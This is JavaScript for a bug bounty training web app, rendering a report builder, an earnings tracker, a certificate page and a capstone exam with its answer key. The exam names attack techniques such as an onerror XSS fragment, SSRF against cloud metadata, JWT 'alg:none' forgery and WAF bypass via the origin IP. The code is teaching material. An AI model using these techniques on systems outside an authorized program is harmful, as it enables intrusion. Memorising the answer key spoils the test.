    if(!list.children.length)list.innerHTML='<p style="color:var(--muted);margin-top:10px">No matches in this tab.</p>';
  }
  search.addEventListener("input",()=>draw(search.value));
  draw("");
  $("#main").scrollTop=0;
}

/* ============================================================
   REPORT BUILDER
   ============================================================ */
function renderReport(){
  const v=$("#view");
  v.innerHTML='<div class="eyebrow">// Operator tools</div><h2 class="lesson-h">Report Builder</h2>'
    +'<div class="lesson-sub">Turn a finding into a clean, triage-ready report — a good write-up is how you get paid</div>';
  const grid=el("div","rep-grid");
  const form=el("div","rep-form");
  const preview=el("div","rep-preview");
  grid.appendChild(form);grid.appendChild(preview);v.appendChild(grid);
  const fields=[
    ["title","Title","input","IDOR on /api/invoice allows reading any user's invoices"],
    ["target","Target / endpoint","input","https://app.example.com/api/invoice?id="],
    ["severity","Severity","select",["Critical","High","Medium","Low","Informational"]],
    ["cvss","CVSS vector (optional)","input","CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"],
    ["summary","Summary","textarea","Two sentences: what it is and why it matters."],
    ["steps","Steps to reproduce","textarea","1. Log in as user A and capture GET /api/invoice?id=1024\n2. Change id to 1023 and replay\n3. Observe user B's invoice returned"],
    ["impact","Impact","textarea","Any authenticated user can read every other user's invoices (PII + billing)."],
    ["poc","Proof of concept","textarea","Request/response pair, or a short script. Reference screenshots."],
    ["remediation","Remediation","textarea","Enforce a server-side object-level authorization check: verify the invoice belongs to the session user."]
  ];
  const state={};
  try{Object.assign(state,JSON.parse(localStorage.getItem("firstbounty.report")||"{}"));}catch(e){}
  function saveDraft(){try{localStorage.setItem("firstbounty.report",JSON.stringify(state));}catch(e){}}
  fields.forEach(([k,label,type,ph])=>{
    const wrap=el("div","rep-field");
    wrap.appendChild(el("label",null,esc(label)));
    let input;
    if(type==="select"){input=el("select");ph.forEach(o=>{const op=el("option",null,o);op.value=o;input.appendChild(op);});input.value=state[k]||"Medium";}
    else if(type==="textarea"){input=el("textarea");input.rows=k==="steps"?5:3;input.placeholder=ph;input.value=state[k]||"";}
    else{input=el("input");input.type="text";input.placeholder=ph;input.value=state[k]||"";}
    if(!(k in state))state[k]=(type==="select")?input.value:"";
    const upd=()=>{state[k]=input.value;saveDraft();draw();};
    input.addEventListener("input",upd);input.addEventListener("change",upd);
    wrap.appendChild(input);form.appendChild(wrap);
  });
  const ph=k=>fields.find(f=>f[0]===k)[3];
  function md(){
    const sevTag={Critical:"🔴 Critical",High:"🟠 High",Medium:"🟡 Medium",Low:"🔵 Low",Informational:"⚪ Informational"}[state.severity||"Medium"];
    const g=(k)=>state[k]&&state[k].trim()?state[k]:"_(fill in: "+ph(k)+")_";
    return "# "+(state.title&&state.title.trim()?state.title:"[Title — bug type on endpoint leading to impact]")+"\n\n"
      +"**Severity:** "+sevTag+(state.cvss&&state.cvss.trim()?"  \n**CVSS:** `"+state.cvss+"`":"")+"\n\n"
      +"**Target:** "+(state.target&&state.target.trim()?state.target:"[endpoint]")+"\n\n"
      +"## Summary\n"+g("summary")+"\n\n"
      +"## Steps to Reproduce\n"+g("steps")+"\n\n"
      +"## Impact\n"+g("impact")+"\n\n"
      +"## Proof of Concept\n"+g("poc")+"\n\n"
      +"## Remediation\n"+g("remediation")+"\n\n"
      +"---\n_Tested only within program scope. No real user data was accessed; PoC used accounts I control._";
  }
  function draw(){
    preview.innerHTML='<div class="rep-prev-h"><span>Live preview · Markdown</span></div><pre class="rep-prev-body"><code>'+esc(md())+'</code></pre>';
    preview.querySelector(".rep-prev-h").appendChild(copyBtn(md(),"Copy report"));
  }
  draw();
  $("#main").scrollTop=0;
}

/* ============================================================
   HUNT TRACKER  (your private real-bounty scoreboard)
   ============================================================ */
function huntState(){try{return JSON.parse(localStorage.getItem("firstbounty.hunt")||'{"reports":[]}');}catch(e){return {reports:[]};}}
function huntSave(o){try{localStorage.setItem("firstbounty.hunt",JSON.stringify(o));}catch(e){}}
function uid(){return Date.now().toString(36)+Math.random().toString(36).slice(2,6);}
const HT_SEV=["Critical","High","Medium","Low","Info"];
const HT_SEV_CLS={Critical:"crit",High:"high",Medium:"med",Low:"low",Info:"info"};
const HT_STATUS=["Draft","Submitted","Triaged","Accepted","Resolved","Paid","Duplicate","N/A","Informative"];
const HT_STATUS_COLOR={Draft:"var(--muted)",Submitted:"var(--low)",Triaged:"var(--med)",Accepted:"var(--ok)",Resolved:"var(--ok)",Paid:"var(--ok)",Duplicate:"var(--muted)","N/A":"var(--crit)",Informative:"var(--info)"};
const HT_PLATFORMS=["HackerOne","Bugcrowd","Intigriti","YesWeHack","Private","Other"];
function htMonthKey(d){const x=new Date(d);return x.getFullYear()+"-"+String(x.getMonth()+1).padStart(2,"0");}
function htMonthsBack(n){const now=new Date();const a=[];for(let i=n-1;i>=0;i--){const d=new Date(now.getFullYear(),now.getMonth()-i,1);a.push({key:htMonthKey(d),label:d.toLocaleDateString("en",{month:"short"})});}return a;}
function huntStats(reps){
  const now=new Date(),cur=htMonthKey(now);let total=0,thisMonth=0;const byMonth={};
  reps.forEach(r=>{const b=Number(r.bounty)||0;total+=b;if(r.date){const mk=htMonthKey(r.date);byMonth[mk]=(byMonth[mk]||0)+b;if(mk===cur)thisMonth+=b;}});
  let last3=0;for(let i=0;i<3;i++){const d=new Date(now.getFullYear(),now.getMonth()-i,1);last3+=byMonth[htMonthKey(d)]||0;}
  const decided=reps.filter(r=>["Accepted","Resolved","Paid","Duplicate","N/A","Informative"].includes(r.status)).length;
  const valid=reps.filter(r=>["Accepted","Resolved","Paid"].includes(r.status)).length;
  const pending=reps.filter(r=>["Submitted","Triaged","Draft"].includes(r.status)).length;
  return {total,thisMonth,avg3:last3/3,validRate:decided?Math.round(valid/decided*100):0,valid,pending,count:reps.length,byMonth};
}
function huntChart(S){
  const months=htMonthsBack(6),vals=months.map(m=>S.byMonth[m.key]||0),target=500;
  const max=Math.max(target*1.2,...vals,1),W=600,H=180,padB=28,padT=18,padL=10,padR=10,n=months.length,bw=(W-padL-padR)/n;
  const y=v=>padT+(H-padT-padB)*(1-v/max);let bars="";
  months.forEach((m,i)=>{
    const x=padL+i*bw,bh=(H-padT-padB)*(vals[i]/max),bx=x+bw*0.22,bwid=bw*0.56,by=H-padB-bh;
    bars+='<rect x="'+bx.toFixed(1)+'" y="'+by.toFixed(1)+'" width="'+bwid.toFixed(1)+'" height="'+Math.max(0,bh).toFixed(1)+'" rx="4" fill="var(--accent)"/>';
    if(vals[i]>0)bars+='<text x="'+(bx+bwid/2).toFixed(1)+'" y="'+(by-5).toFixed(1)+'" text-anchor="middle" font-size="10" fill="var(--fg-dim)" font-family="monospace">€'+vals[i]+'</text>';
    bars+='<text x="'+(x+bw/2).toFixed(1)+'" y="'+(H-9)+'" text-anchor="middle" font-size="10" fill="var(--muted)" font-family="monospace">'+esc(m.label)+'</text>';
  });
  const ty=y(target);
  const tl='<line x1="'+padL+'" y1="'+ty.toFixed(1)+'" x2="'+(W-padR)+'" y2="'+ty.toFixed(1)+'" stroke="var(--ok)" stroke-width="1.5" stroke-dasharray="5 4"/><text x="'+(W-padR)+'" y="'+(ty-4).toFixed(1)+'" text-anchor="end" font-size="9.5" fill="var(--ok)" font-family="monospace">goal €500</text>';
  return '<svg viewBox="0 0 '+W+' '+H+'" width="100%" preserveAspectRatio="xMidYMid meet" style="max-width:100%;display:block">'+tl+bars+'</svg>';
}
function huntExamples(){
  const now=new Date(),mk=back=>{const d=new Date(now.getFullYear(),now.getMonth()-back,15);return d.toISOString().slice(0,10);};
  return [
    {id:uid(),title:"[example] IDOR on /api/invoice — any user's data",program:"Acme VDP",platform:"Intigriti",severity:"High",status:"Paid",bounty:450,date:mk(0),notes:"Proved with two accounts I own."},
    {id:uid(),title:"[example] Reflected XSS in search",program:"Globex",platform:"HackerOne",severity:"Medium",status:"Resolved",bounty:200,date:mk(1),notes:""},
    {id:uid(),title:"[example] Subdomain takeover (dangling S3)",program:"Initech",platform:"YesWeHack",severity:"High",status:"Paid",bounty:300,date:mk(1),notes:""},
    {id:uid(),title:"[example] Open redirect in /login",program:"Globex",platform:"HackerOne",severity:"Low",status:"Duplicate",bounty:0,date:mk(2),notes:"Dupe — already known."},
    {id:uid(),title:"[example] Exposed .env on staging",program:"Acme VDP",platform:"Intigriti",severity:"High",status:"Triaged",bounty:0,date:mk(0),notes:"Awaiting triage."}
  ];
}
function renderTracker(){
  const v=$("#view");
  const st=huntState();const reps=(st.reports||[]).slice().sort((a,b)=>(b.date||"").localeCompare(a.date||""));
  const S=huntStats(reps);
  const avgColor=S.avg3>=400?"var(--ok)":(S.avg3>0?"var(--accent)":"var(--muted)");
  const avgTag=S.avg3>=600?"above goal":(S.avg3>=400?"on target":(S.avg3>0?"building":"no data yet"));
  v.innerHTML='<div class="eyebrow">// Operator tools</div><h2 class="lesson-h">Hunt Tracker</h2>'
    +'<div class="lesson-sub">Your private log of real targets, reports & earnings — the €400–600 scoreboard</div>';
  const note=el("div","note");note.innerHTML='<span class="nt">Your data, your device</span><p>This is saved only in <strong>this browser</strong> — no server, no account. It survives refreshes, but clearing site data wipes it, so use <strong>Export</strong> to back it up. Log a report the moment you submit it; update the status and bounty as it moves.</p>';
  v.appendChild(note);
  // KPIs
  const kpis=el("div","ht-kpis");
  kpis.innerHTML=
    '<div class="ht-kpi hero-kpi"><div class="k-n" style="color:'+avgColor+'">€'+Math.round(S.avg3)+'</div><div class="k-l">3-month avg · <span style="color:'+avgColor+'">'+avgTag+'</span><div class="k-sub">goal €400–600</div></div></div>'
    +'<div class="ht-kpi"><div class="k-n">€'+S.thisMonth+'</div><div class="k-l">This month</div></div>'
    +'<div class="ht-kpi"><div class="k-n">€'+S.total+'</div><div class="k-l">Total earned</div></div>'
    +'<div class="ht-kpi"><div class="k-n">'+S.count+'</div><div class="k-l">Reports</div></div>'
    +'<div class="ht-kpi"><div class="k-n">'+S.validRate+'%</div><div class="k-l">Valid rate</div></div>'
    +'<div class="ht-kpi"><div class="k-n">'+S.pending+'</div><div class="k-l">Pending</div></div>';
  v.appendChild(kpis);
  // chart
  const chart=el("div","ht-chart");chart.innerHTML='<div class="ht-chart-h">Earnings · last 6 months</div>'+huntChart(S);
  v.appendChild(chart);
  // toolbar
  const bar=el("div","ht-toolbar");
  const addBtn=el("button","btn","+ Add report");
  bar.appendChild(addBtn);
  if(!reps.length){const ex=el("button","btn ghost","Load example data");ex.onclick=()=>{const s=huntState();s.reports=huntExamples();huntSave(s);renderTracker();};bar.appendChild(ex);}
  v.appendChild(bar);
  const formWrap=el("div","ht-formwrap");v.appendChild(formWrap);
  const listWrap=el("div","ht-list");v.appendChild(listWrap);
  // backup
  const backup=el("details","ht-backup");
  backup.innerHTML='<summary>Backup & restore (export / import JSON)</summary>';
  const bbody=el("div","ht-backup-body");
  const exBtn=copyBtn(JSON.stringify(huntState()),"Copy my data (JSON)");
  bbody.appendChild(exBtn);
  const ta=el("textarea");ta.placeholder="Paste a previously exported JSON here to restore…";ta.rows=3;ta.className="ht-import";
  const imp=el("button","btn ghost","Import (replace all)");let impArm=false;
  imp.onclick=()=>{
    if(!ta.value.trim()){return;}
    if(!impArm){impArm=true;imp.textContent="Confirm — this overwrites everything";setTimeout(()=>{impArm=false;imp.textContent="Import (replace all)";},3000);return;}
    try{const o=JSON.parse(ta.value);if(!o||!Array.isArray(o.reports))throw 0;huntSave({reports:o.reports});renderTracker();}
    catch(e){imp.textContent="Invalid JSON";setTimeout(()=>imp.textContent="Import (replace all)",1500);}
  };
  bbody.appendChild(ta);bbody.appendChild(imp);
  backup.appendChild(bbody);v.appendChild(backup);

  function pill(status){const c=HT_STATUS_COLOR[status]||"var(--muted)";return '<span class="ht-pill" style="color:'+c+';background:color-mix(in srgb,'+c+' 16%,transparent)">'+esc(status)+'</span>';}
  function sevPill(sev){return '<span class="sev '+(HT_SEV_CLS[sev]||"info")+'">'+esc(sev)+'</span>';}
  function drawList(){
    listWrap.innerHTML="";
    if(!reps.length){listWrap.innerHTML='<div class="ht-empty">No reports yet. Hit <strong>+ Add report</strong> the next time you submit one — or load the example data to see how the scoreboard fills in.</div>';return;}
    reps.forEach(r=>{
      const row=el("div","ht-report");
      row.innerHTML='<div class="htr-main"><div class="htr-title">'+esc(r.title||"(untitled)")+'</div>'
        +'<div class="htr-meta">'+esc(r.program||"—")+' · '+esc(r.platform||"—")+' · '+esc(r.date||"—")+(r.notes?' · '+esc(r.notes):'')+'</div></div>'
        +'<div class="htr-side">'+sevPill(r.severity||"Info")+pill(r.status||"Draft")+'<span class="htr-bounty">'+(Number(r.bounty)>0?'€'+Number(r.bounty):'—')+'</span></div>';
      const act=el("div","htr-act");
      const ed=el("button","htr-btn","edit");ed.onclick=()=>openForm(r);
      const del=el("button","htr-btn del","✕");let armed=false;
      del.onclick=()=>{if(!armed){armed=true;del.textContent="delete?";setTimeout(()=>{armed=false;del.textContent="✕";},2500);return;}const s=huntState();s.reports=(s.reports||[]).filter(x=>x.id!==r.id);huntSave(s);renderTracker();};
      act.appendChild(ed);act.appendChild(del);row.appendChild(act);
      listWrap.appendChild(row);
    });
  }
  function openForm(rep){
    const editing=!!rep;const r=rep||{id:uid(),title:"",program:"",platform:"HackerOne",severity:"Medium",status:"Submitted",bounty:"",date:new Date().toISOString().slice(0,10),notes:""};
    formWrap.innerHTML="";
    const f=el("div","ht-form");
    f.innerHTML='<div class="ht-form-h">'+(editing?"Edit report":"New report")+'</div>';
    const grid=el("div","ht-form-grid");
    function field(label,node,full){const w=el("div","ht-field"+(full?" full":""));w.appendChild(el("label",null,label));w.appendChild(node);return w;}
    const title=el("input");title.type="text";title.value=r.title;title.placeholder="e.g. IDOR on /api/invoice leading to data exposure";
    const program=el("input");program.type="text";program.value=r.program;program.placeholder="Program name";
    const platform=el("select");HT_PLATFORMS.forEach(p=>{const o=el("option",null,p);o.value=p;platform.appendChild(o);});platform.value=r.platform;
    const sev=el("select");HT_SEV.forEach(p=>{const o=el("option",null,p);o.value=p;sev.appendChild(o);});sev.value=r.severity;
    const status=el("select");HT_STATUS.forEach(p=>{const o=el("option",null,p);o.value=p;status.appendChild(o);});status.value=r.status;
    const bounty=el("input");bounty.type="number";bounty.min="0";bounty.value=r.bounty;bounty.placeholder="€ (when awarded)";
    const date=el("input");date.type="date";date.value=r.date;
    const notes=el("input");notes.type="text";notes.value=r.notes;notes.placeholder="Short note (optional)";
    grid.appendChild(field("Title",title,true));
    grid.appendChild(field("Program",program));
    grid.appendChild(field("Platform",platform));
    grid.appendChild(field("Severity",sev));
    grid.appendChild(field("Status",status));
    grid.appendChild(field("Bounty (€)",bounty));
    grid.appendChild(field("Date",date));
    grid.appendChild(field("Notes",notes,true));
    f.appendChild(grid);
    const actions=el("div","ht-form-act");
    const save=el("button","btn","Save report");
    save.onclick=()=>{
      if(!title.value.trim()){title.style.borderColor="var(--crit)";return;}
      const obj={id:r.id,title:title.value.trim(),program:program.value.trim(),platform:platform.value,severity:sev.value,status:status.value,bounty:bounty.value===""?0:Number(bounty.value),date:date.value,notes:notes.value.trim()};
      const s=huntState();s.reports=s.reports||[];const idx=s.reports.findIndex(x=>x.id===r.id);
      if(idx>=0)s.reports[idx]=obj;else s.reports.push(obj);
      huntSave(s);renderTracker();
    };
    const cancel=el("button","btn ghost","Cancel");cancel.onclick=()=>{formWrap.innerHTML="";};
    actions.appendChild(save);actions.appendChild(cancel);f.appendChild(actions);
    formWrap.appendChild(f);
    formWrap.scrollIntoView({behavior:"smooth",block:"nearest"});
  }
  addBtn.onclick=()=>openForm(null);
  drawList();
  $("#main").scrollTop=0;
}

/* ============================================================
   CAPSTONE EXAM  (gates the verified certificate)
   ============================================================ */
const CAPSTONE=[
  {q:"You find a bug on a domain NOT listed in the program scope. Correct action?",opts:["Test it quietly and report if it's good","Leave it alone — out of scope is off-limits","Test gently without reporting"],a:1,topic:"Rules of engagement (MOD_00)"},
  {q:"Changing ?id=1024 to 1023 returns another user's data with your valid session. The flaw is:",opts:["Broken authentication","Missing authorization — IDOR","Nothing, IDs are public"],a:1,topic:"Access control (MOD_03)"},
  {q:"Your input lands in an HTML attribute and <script> is stripped. Best move?",opts:["Give up","Break out of the attribute, then inject an event handler","Switch to SQL injection"],a:1,topic:"XSS (MOD_04)"},
  {q:"The single best real-world defense against SQL injection is:",opts:["Blocking the word SELECT","Parameterized queries / prepared statements","Hiding error messages"],a:1,topic:"SQLi (MOD_05)"},
  {q:"Why is 169.254.169.254 a prime SSRF target on cloud-hosted apps?",opts:["It's a public API","It serves instance metadata, often including cloud credentials","It's the DNS server"],a:1,topic:"SSRF (MOD_06)"},
  {q:"An SSRF response contains data from 10.0.4.12. What does that tell you?",opts:["It's a public website","You've reached a private (RFC 1918) internal host","It's the metadata endpoint"],a:1,topic:"Networking (MOD_01)"},
  {q:"Why can Burp read your HTTPS traffic when a random attacker on your Wi-Fi cannot?",opts:["Burp cracks the encryption","You installed Burp's CA certificate, so your browser trusts its MITM","HTTPS is actually unencrypted"],a:1,topic:"Networking / TLS (MOD_01)"},
  {q:"The highest-leverage beginner recon habit on wide-scope programs is:",opts:["Brute-forcing logins","Subdomain enumeration to expand attack surface","DoS testing"],a:1,topic:"Recon (MOD_02)"},
  {q:"A state-changing POST is accepted with only the session cookie, no anti-CSRF token. It's vulnerable to:",opts:["XSS","CSRF","SQL injection"],a:1,topic:"CSRF (MOD_07)"},
  {q:"A JWT with \"alg\":\"none\" is accepted by the server. Why is that critical?",opts:["It's faster","No signature is verified, so you can forge any identity/role","It encrypts better"],a:1,topic:"Auth / JWT (MOD_07)"},
  {q:"Redeeming a single-use gift card multiple times via simultaneous requests is a:",opts:["Caching bug","Race condition","Reflected XSS"],a:1,topic:"Business logic (MOD_07)"},
  {q:"Adding \"isAdmin\":true to a profile-update JSON and becoming admin is:",opts:["IDOR","Mass assignment","CSRF"],a:1,topic:"Access control (MOD_03)"},
  {q:"A subdomain's CNAME points to an S3 bucket returning 'NoSuchBucket'. This is:",opts:["A DNS outage to report","A subdomain takeover opportunity","Normal behavior"],a:1,topic:"Takeover (MOD_08)"},
  {q:"A server reflects any Origin and sends Access-Control-Allow-Credentials: true. Impact?",opts:["None","Any website can read a logged-in victim's private data","Faster responses"],a:1,topic:"CORS (MOD_08)"},
  {q:"What most drives the size of a bounty payout?",opts:["Report length","Demonstrated impact","Number of screenshots"],a:1,topic:"Reporting (MOD_09)"},
  {q:"The smartest early strategy for consistent income is to:",opts:["Master every bug class before reporting","Specialize in 2 high-frequency classes across many programs","Hunt one program forever"],a:1,topic:"Strategy (MOD_00)"},
  {q:"The safest way to prove an IDOR on a live program is:",opts:["Pull a random real user's records","Use two accounts you control","Rapidly scan all IDs"],a:1,topic:"Ethics (MOD_03)"},
  {q:"Open redirect alone is often Low. How do you make it pay more?",opts:["Report 50 of them","Chain it — OAuth token theft, SSRF boost, phishing","Add XSS to the URL bar"],a:1,topic:"Chaining (MOD_08)"},
  {q:"Which tool turns a list of subdomains into live, titled, tech-detected targets?",opts:["nmap","httpx","sqlmap"],a:1,topic:"Tooling (Arsenal)"},
  {q:"With an innerHTML sink, a <script> tag won't execute — but what will?",opts:["Nothing","An element with an event handler, e.g. <img src=x onerror=…>","Only <script> works"],a:1,topic:"DOM XSS (MOD_04)"},
  {q:"A WAF blocks your payloads. A promising bypass is to:",opts:["Give up","Find the origin server's real IP and hit it directly","Send the payload 100 times"],a:1,topic:"Infra / WAF (MOD_01)"},
  {q:"Your first 15 reports are all duplicates or N/A. This means:",opts:["Bug bounty doesn't work for you","You're in the normal 'duplicate valley' — adjust targets & depth","You should only hunt criticals"],a:1,topic:"Mindset (MOD_00)"}
];
const CAP_N=12, CAP_PASS=10;
function capState(){try{return JSON.parse(localStorage.getItem("firstbounty.capstone")||"{}");}catch(e){return{};}}
function capSave(o){try{localStorage.setItem("firstbounty.capstone",JSON.stringify(o));}catch(e){}}
function capPassed(){return !!capState().passed;}
function shuffle(a){a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
function renderCapstone(){
  const v=$("#view");
  v.innerHTML='<div class="eyebrow">// Operator tools</div><h2 class="lesson-h">'+esc(t("cap.title"))+'</h2>'
    +'<div class="lesson-sub">'+esc(t("cap.sub"))+'</div>';
  const st=capState();
  const body=el("div");v.appendChild(body);
  function intro(){
    body.innerHTML="";
    const note=el("div","note");note.innerHTML='<span class="nt">'+esc(t("cap.title"))+'</span><p>'+t("cap.intro")+'</p>';
    body.appendChild(note);
    if(st.passed){
      const ok=el("div","note money");ok.innerHTML='<span class="nt">'+esc(t("cap.passedBadge"))+'</span><p>'+esc(t("cap.score"))+': '+(st.best||CAP_PASS)+'/'+CAP_N+'. '+esc(t("cert.sealVerified"))+'.</p>';
      body.appendChild(ok);
      const go=el("button","btn",esc(t("cap.goCert")));go.onclick=()=>showTool('certificate');body.appendChild(go);
      const rt=el("button","btn ghost",esc(t("cap.retake")));rt.style.marginLeft="10px";rt.onclick=exam;body.appendChild(rt);
    } else {
      const start=el("button","btn",esc(t("cap.start")));start.onclick=exam;body.appendChild(start);
    }
  }
  function exam(){
    body.innerHTML="";
    const qs=shuffle(CAPSTONE).slice(0,CAP_N).map(q=>{const opts=q.opts.map((o,i)=>({o,correct:i===q.a}));return {q:q.q,topic:q.topic,opts:shuffle(opts)};});
    const answers=new Array(CAP_N).fill(-1);
    const counter=el("div","cap-counter");body.appendChild(counter);
    function updCounter(){const n=answers.filter(a=>a>=0).length;counter.textContent=n+"/"+CAP_N+" "+t("cap.answered");}
    qs.forEach((item,qi)=>{
      const box=el("div","quiz");
      box.innerHTML='<div class="q">'+(qi+1)+'. '+esc(item.q)+'</div>';
      item.opts.forEach((opt,oi)=>{
        const b=el("button","opt",esc(opt.o));
        b.onclick=()=>{answers[qi]=oi;box.querySelectorAll(".opt").forEach(x=>x.classList.remove("sel"));b.classList.add("sel");updCounter();};
        box.appendChild(b);
      });
      body.appendChild(box);
    });
    updCounter();
    const submit=el("button","btn",esc(t("cap.submit")));
    const msg=el("div","cap-msg");
    submit.onclick=()=>{
      if(answers.some(a=>a<0)){msg.className="cap-msg bad";msg.textContent=t("cap.needAll");return;}
      let score=0;const missed=[];
      qs.forEach((item,qi)=>{if(item.opts[answers[qi]].correct)score++;else missed.push(item.topic);});
      const passed=score>=CAP_PASS;
      const prev=capState();
      capSave({passed:prev.passed||passed,best:Math.max(prev.best||0,score),attempts:(prev.attempts||0)+1});
      result(score,passed,missed);
    };
    const bar=el("div","cap-submit-bar");bar.appendChild(submit);bar.appendChild(msg);body.appendChild(bar);
    $("#main").scrollTop=0;
  }
  function result(score,passed,missed){
    body.innerHTML="";
    const card=el("div","note "+(passed?"money":"warn"));
    card.innerHTML='<span class="nt">'+esc(passed?t("cap.passTitle"):t("cap.failTitle"))+'</span>'
      +'<p><strong>'+esc(t("cap.score"))+': '+score+'/'+CAP_N+'</strong> ('+esc(t("cap.pass"))+')</p>';
    body.appendChild(card);
    if(!passed&&missed.length){
      const uniq=[...new Set(missed)];
      const rev=el("div","cap-review");rev.innerHTML='<div class="cap-review-h">'+esc(t("cap.review"))+'</div>'+uniq.map(m=>'<span class="spec-chip">'+esc(m)+'</span>').join('');
      body.appendChild(rev);
    }
    const actions=el("div","cert-act");
    if(passed||capPassed()){const go=el("button","btn",esc(t("cap.goCert")));go.onclick=()=>showTool('certificate');actions.appendChild(go);}
    const rt=el("button","btn ghost",esc(t("cap.retake")));rt.onclick=exam;actions.appendChild(rt);
    body.appendChild(actions);
    renderStats();renderSidebarRings();
    $("#main").scrollTop=0;
  }
  intro();
  $("#main").scrollTop=0;
}

/* ============================================================
   CERTIFICATE  (shareable achievement)
   ============================================================ */
function renderCertificate(){
  const v=$("#view");const h=getHandle();const verified=capPassed();
  v.innerHTML='<div class="eyebrow">// Operator tools</div><h2 class="lesson-h">'+esc(t("cert.title"))+'</h2>'
    +'<div class="lesson-sub">'+esc(t("cert.sub"))+'</div>';
  if(!verified){
    const gate=el("div","note");gate.innerHTML='<span class="nt">'+esc(t("cert.gateTitle"))+'</span><p>'+t("cert.gateBody")+'</p>';
    const gb=el("button","btn",esc(t("cert.gateBtn")));gb.style.marginTop="10px";gb.onclick=()=>showTool('capstone');gate.appendChild(gb);
    v.appendChild(gate);
  }
  const hr=el("div","cert-handle");
  hr.appendChild(el("label",null,esc(t("cert.handleLabel"))));
  const hi=el("input");hi.type="text";hi.placeholder="e.g. n0ctis";hi.value=h;hi.maxLength=24;hi.spellcheck=false;
  hr.appendChild(hi);v.appendChild(hr);
  const seal=verified?'<span class="cert-seal">'+esc(t("cert.sealVerified"))+'</span>'
    :(pct()>=100?'<span class="cert-seal partial">'+esc(t("cert.sealComplete"))+'</span>':'<span class="cert-seal partial">'+pct()+'%</span>');
  const cert=el("div","cert"+(verified?" full":""));
  cert.innerHTML=
    '<div class="cert-top"><span class="cert-logo">&gt;_</span><span class="cert-brand">FIRST BOUNTY</span>'+seal+'</div>'
    +'<div class="cert-cap">'+esc(t("cert.certifies"))+'</div>'
    +'<div class="cert-name">'+esc(h||t("cert.anon"))+'</div>'
    +'<div class="cert-desc">'+esc(t("cert.desc"))+'</div>'
    +'<div class="cert-grid">'
      +'<div><span class="cn">'+pct()+'%</span><span class="cl">'+esc(t("cert.complete"))+'</span></div>'
      +'<div><span class="cn">'+esc(rankName())+'</span><span class="cl">'+esc(t("cert.rank"))+'</span></div>'
      +'<div><span class="cn">'+solvedCount()+'/'+labTotal()+'</span><span class="cl">'+esc(t("cert.labs"))+'</span></div>'
      +'<div><span class="cn">'+totalXP()+'</span><span class="cl">'+esc(t("cert.xp"))+'</span></div>'
    +'</div>'
    +'<div class="cert-foot"><span>'+esc(t("cert.issued"))+' '+esc(new Date().toLocaleDateString())+'</span><span>'+esc(t("cert.selfpaced"))+'</span></div>';
  v.appendChild(cert);
  hi.addEventListener("input",()=>{setHandle(hi.value.trim());cert.querySelector(".cert-name").textContent=hi.value.trim()||t("cert.anon");});
  const act=el("div","cert-act");
  const cs=el("button","btn",esc(t("cert.copy")));
  cs.onclick=()=>{const txt=shareText();const ok=()=>{cs.textContent="Copied ✓";setTimeout(()=>cs.textContent=t("cert.copy"),1500);};
    copyText(txt).then(ok).catch(()=>{try{const ta=document.createElement("textarea");ta.value=txt;ta.style.position="fixed";ta.style.opacity="0";document.body.appendChild(ta);ta.select();document.execCommand&&document.execCommand("copy");document.body.removeChild(ta);ok();}catch(e){cs.textContent="Select & copy";}});};
  act.appendChild(cs);
  const back=el("button","btn ghost",esc(t("cert.back")));back.onclick=()=>showTool('home');act.appendChild(back);
  v.appendChild(act);
  v.appendChild(el("div","cert-note",esc(t("cert.note"))));
  $("#main").scrollTop=0;
}

/* ============================================================
   DRAWER (mobile)
   ============================================================ */
function closeDrawer(){$("#sidebar").classList.remove("open");$("#overlay").classList.remove("show");}
$("#menuToggle").onclick=()=>{$("#sidebar").classList.toggle("open");$("#overlay").classList.toggle("show");};
$("#overlay").onclick=closeDrawer;

/* ============================================================
   BOOT
   ============================================================ */
COURSE[0]._open=true;
applyLang();
$("#langToggle").onclick=toggleLang;
renderSidebar();
renderStats();
renderHome();
